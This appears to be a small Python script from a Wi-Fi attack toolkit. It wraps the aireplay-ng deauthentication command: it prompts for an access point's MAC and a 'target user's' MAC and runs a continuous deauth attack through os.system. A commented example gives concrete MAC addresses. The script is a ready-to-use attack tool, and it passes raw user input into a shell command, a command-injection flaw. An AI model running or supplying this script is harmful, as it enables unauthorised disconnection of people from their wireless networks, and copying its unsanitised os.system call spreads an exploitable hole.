import os
from colorama import Fore, Back, Style
from function_aireplay import main_aireplay_ng,text_color

#sudo aireplay-ng -0 0 -a 3A:CB:E4:C2:A7:47 -c 18:4F:32:FB:60:DD wlan0mon
print("->sudo aireplay-ng -0 "+Style.BRIGHT+Fore.YELLOW+"<num_send>"
      +Style.NORMAL+Fore.WHITE+" -a "+Style.BRIGHT+Fore.YELLOW+"<network_mac_mac>"+Style.NORMAL+Fore.WHITE+
      " -c "+Style.BRIGHT+Fore.YELLOW+"<client_mac>"+Style.NORMAL+Fore.WHITE+" wlan0mon\n")

print("->you can use " +text_color("'p'",Fore.RED)+ " for mac stored mode\n")
print("->If network_mac is " +text_color("'rn'",Fore.RED)+ " or client_mac is " +text_color("'rc'",Fore.RED))
print("According to the entered value, the file responsible")
print("for storing one of them will delete all the elements inside it\n")
print("->you can use " +text_color("'l'",Fore.RED)+ " for mac stored mode\n")


try:
    network_mac = input("Enter the network_mac's MAC:")
    client_mac = input("Enter the target user's Mac:")
    num_send = "0"
    os.system(main_aireplay_ng(network_mac,client_mac,num_send))
except:
    print(text_color("\ninvaled input",Fore.RED))
